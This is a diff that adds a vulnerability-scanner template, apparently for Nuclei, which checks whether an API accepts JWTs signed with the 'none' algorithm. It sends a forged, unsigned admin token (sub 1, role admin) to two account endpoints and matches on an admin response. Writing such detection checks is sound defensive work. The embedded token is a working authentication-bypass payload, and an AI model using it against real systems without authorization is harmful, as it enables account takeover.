@@ -1,0 +1,23 @@
+id: jwt-alg-none-signature-bypass
+info:
+  name: JWT 'alg:none' accepted (signature verification bypass)
+  severity: critical
+  description: The API accepts a JWT with the "none" algorithm and an empty signature, so an attacker can forge a token for any user/role. This probe presents an unsigned admin (sub=1) token and receives the admin account.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/auth/me"
+      - "{{BaseURL}}/api/v1/account"
+    headers:
+      Authorization: "Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAxLCAicm9sZSI6ICJhZG1pbiJ9."
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "\"role\":\"admin\""
+          - "admin@faultline.local"
